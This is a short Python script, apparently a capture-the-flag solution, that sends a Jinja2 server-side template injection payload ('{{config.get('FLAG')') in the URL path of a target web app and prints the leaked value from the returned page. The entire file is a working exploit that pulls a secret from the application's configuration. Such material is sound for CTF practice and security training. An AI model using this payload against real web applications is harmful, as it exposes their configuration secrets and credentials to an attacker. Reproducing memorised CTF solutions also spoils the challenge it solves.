from lib import verify

from httpx import get
from bs4 import BeautifulSoup

a = get(input() + "/{{config.get('FLAG')")
bs = BeautifulSoup(a.raise_for_status().text, "lxml")
print(verify(bs.find("h3")).text[1:]) # pyright: ignore[reportAny]

